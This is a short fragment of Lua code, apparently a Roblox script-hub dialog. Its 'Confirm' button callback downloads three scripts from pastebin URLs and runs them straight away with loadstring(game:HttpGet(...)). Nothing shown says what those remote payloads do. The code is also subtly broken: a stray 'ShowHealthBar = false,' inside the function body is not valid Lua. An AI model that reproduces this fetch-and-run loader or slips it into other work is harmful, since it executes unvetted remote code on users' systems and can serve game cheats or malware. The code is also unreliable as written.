                    {
                        Title = "Confirm",
                        Callback = function()
                          loadstring(game:HttpGet("https://pastebin.com/raw/V5n9KFMi"))()
                           loadstring(game:HttpGet("https://pastebin.com/raw/tVyFVKcx"))()
                           wait(0.1)
                           loadstring(game:HttpGet("https://pastebin.com/raw/gSLVHQMQ"))()
                           ShowHealthBar = false,
                           print("Confirmed the dialog.")
                        end
                    },
                    {
                        Title = "Cancel",
